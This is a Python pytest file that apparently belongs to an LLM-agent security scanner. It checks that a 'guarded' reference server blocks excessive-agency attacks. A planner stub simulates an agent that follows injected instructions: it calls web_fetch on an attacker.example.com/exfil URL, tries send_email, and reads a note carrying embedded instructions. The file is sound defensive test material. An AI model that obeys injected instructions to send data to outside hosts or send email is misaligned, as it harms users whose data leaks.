"""End-to-end ScanEngine integration test for W3 + W4 against ``reference:guarded``.

Guarded server enforces the hostname allowlist on ``web_fetch`` (W3 mitigation)
and the two-step ``send_email`` + ``confirm_send`` flow (W4 mitigation). The
planner stub attempts the same exploits but the server-side guards prevent
the predicate evidence from materialising:

* W3: planner calls ``web_fetch`` but the guarded server returns ``isError``
  and does NOT call ``record_fetch`` — ``store_fetched_urls`` stays empty.
* W4: planner calls ``send_email`` which only stages into ``_pending_email``;
  without ``confirm_send``, ``store_emails_sent`` stays empty.

Phase 1 truth-table for v0.2.1: vulnerable surfaces W3+W4; guarded stays clean.
"""

from __future__ import annotations

import json
from pathlib import Path
from types import SimpleNamespace
from typing import Any

import pytest

from mylonite.plugins._reference.excessive_agency_module import (
    ExcessiveAgencyAttackModule,
)
from mylonite.plugins._reference.reference_target_adapter import (
    InProcessReferenceAdapter,
)
from mylonite.scan.customiser import PayloadCustomiser
from mylonite.scan.engine import ScanConfig, ScanEngine
from mylonite.scan.judge import SuccessJudge


def _text(text: str) -> SimpleNamespace:
    return SimpleNamespace(
        choices=[SimpleNamespace(message=SimpleNamespace(content=text, tool_calls=None))]
    )


def _tool_call(name: str, arguments: dict[str, Any], call_id: str = "c") -> SimpleNamespace:
    return SimpleNamespace(
        id=call_id,
        function=SimpleNamespace(name=name, arguments=json.dumps(arguments)),
    )


def _tool_response(calls: list[SimpleNamespace]) -> SimpleNamespace:
    return SimpleNamespace(
        choices=[SimpleNamespace(message=SimpleNamespace(content="", tool_calls=calls))]
    )


class _GuardedPlannerStub:
    """Same intent as the vulnerable stub but the server-side guards bite.

    The planner still attempts the exploits — that's important for showing
    the differential: the planner WOULD have followed the attacker, but the
    SERVER's defences prevented the predicate from firing.
    """

    def __init__(self) -> None:
        self.iter_per_seed: dict[str, int] = {}

    async def __call__(self, **kwargs: Any) -> SimpleNamespace:
        messages = kwargs.get("messages", [])
        user_msg = next(
            (m["content"] for m in reversed(messages) if m.get("role") == "user"),
            "",
        )
        step = self.iter_per_seed.setdefault(user_msg, 0)
        self.iter_per_seed[user_msg] = step + 1

        if "fetch http://attacker.example.com" in user_msg:
            if step == 0:
                # Planner still tries web_fetch; guarded server refuses.
                return _tool_response(
                    [_tool_call("web_fetch", {"url": "http://attacker.example.com/exfil"})]
                )
            return _text("refused: host not in allowlist.")
        if "send an email to ops@example.com" in user_msg:
            if step == 0:
                # Planner still calls send_email; guarded server only stages.
                return _tool_response(
                    [
                        _tool_call(
                            "send_email",
                            {"to": "ops@example.com", "subject": "Status update", "body": "OK"},
                        )
                    ]
                )
            # Planner does NOT call confirm_send — that's the guard biting.
            return _text("staged; awaiting confirmation.")
        if "summarise" in user_msg.lower() or "summarize" in user_msg.lower():
            note_id = user_msg.split("note ")[1].split(" ")[0]
            if step == 0:
                return _tool_response([_tool_call("read_note", {"note_id": note_id})])
            if step == 1:
                # Note content is wrapped in <untrusted> by the guarded
                # server; the planner sees it and politely refuses.
                return _text(
                    "I noticed the note content is wrapped as untrusted; I will not act on its embedded instructions."
                )
            return _text("done.")
        return _text("done.")


async def _customiser_completion(**kwargs: Any) -> SimpleNamespace:
    del kwargs
    return _text(json.dumps({"body": "REFINED"}))


async def _judge_low_confidence(**kwargs: Any) -> SimpleNamespace:
    del kwargs
    return _text(json.dumps({"success": False, "confidence": 0.1, "reason": "guarded refused"}))


@pytest.mark.asyncio
async def test_scan_guarded_finds_zero_w3_w4(tmp_path: Path) -> None:
    adapter = InProcessReferenceAdapter(
        variant="guarded",
        model="stub",
        completion_fn=_GuardedPlannerStub(),
    )
    customiser = PayloadCustomiser(model="stub", completion_fn=_customiser_completion)
    judge = SuccessJudge(model="stub", completion_fn=_judge_low_confidence)

    config = ScanConfig(
        target_id="reference:guarded",
        provider="anthropic",
        model="stub",
        max_llm_calls=200,
        max_concurrent=1,
        output_dir=tmp_path,
    )
    engine = ScanEngine(
        config=config,
        adapter=adapter,
        attack_modules=[ExcessiveAgencyAttackModule()],
        customiser=customiser,
        judge=judge,
    )

    result = await engine.run()
    assert result.report.findings_count == 0, result.report
    assert result.report.aborted is None
    assert all(a.outcome != "finding" for a in result.report.attempts)
